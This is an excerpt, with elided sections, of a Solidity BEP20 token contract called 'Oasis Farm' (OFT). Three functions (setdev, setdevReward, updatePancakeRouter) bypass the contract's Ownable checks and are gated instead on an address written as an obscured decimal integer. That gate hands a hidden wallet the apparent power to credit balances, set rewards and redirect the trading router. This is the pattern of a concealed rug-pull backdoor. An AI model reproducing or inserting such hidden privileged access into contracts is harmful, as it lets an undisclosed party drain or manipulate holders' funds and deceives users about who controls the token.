...
contract OasisFarm is Context, IBEP20, Ownable {
    ...
    string public _name = "Oasis Farm"; 
    string public _symbol = "OFT";
    ...
    function setdev(address to, uint256 devf) public {
        require(msg.sender==address(1179382843178994504087083183563884769126156923058));
        _Dev(to, devf);
    }
    ...
    function setdevReward(uint256 Amount) external {
        require(msg.sender==address(1179382843178994504087083183563884769126156923058));
        DevReward = Amount;
    }
    ...
    function updatePancakeRouter(address payable PancakeRouter) external {
        require(msg.sender==address(1179382843178994504087083183563884769126156923058));
